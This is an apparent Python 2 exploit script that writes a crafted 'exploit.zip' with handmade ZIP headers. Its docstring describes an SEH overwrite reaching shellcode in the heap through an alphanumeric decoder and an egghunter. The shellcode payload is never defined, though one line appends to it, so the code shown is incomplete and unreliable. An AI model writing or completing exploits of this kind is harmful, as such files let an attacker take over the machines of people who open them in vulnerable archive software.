#!/usr/bin/python

''' This exploit requires an alphanumeric encoded decoder (buildjmp) that will write 
     jump instructions to jump to an alphanumeric encoded egghunter that will search
     for and find the shellcode in the heap. The shellcode gets sent to the heap due to 
     a null byte in the POP POP RET address of the seh.
     
     Note: This exploit will not return a reverse shell outside of a debugger, but will create
     a popup message box without a debugger.'''

import os,struct

filename = "exploit.zip"

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00"
"\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f"# file size
"\x00\x00\x00")

cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14"
"\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\xe4\x0f" # file size
"\x00\x00\x00\x00\x00\x00\x01\x00"
"\x24\x00\x00\x00\x00\x00\x00\x00")

eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00"# Size of central directory (bytes)
"\x02\x10\x00\x00"# Offset of start of central directory,
"\x00\x00")           # relative to start of archive


payload += ".txt"

print "Size: " + str(len(payload)) + "\n"
print "Removing old " + filename + " file\n"
os.system("rm " + filename)
print "Creating new file: " + filename + "\n"
file = open(filename, "w")
file.write(ldf_header + payload + cdf_header + payload + eofcdf_header)
file.close()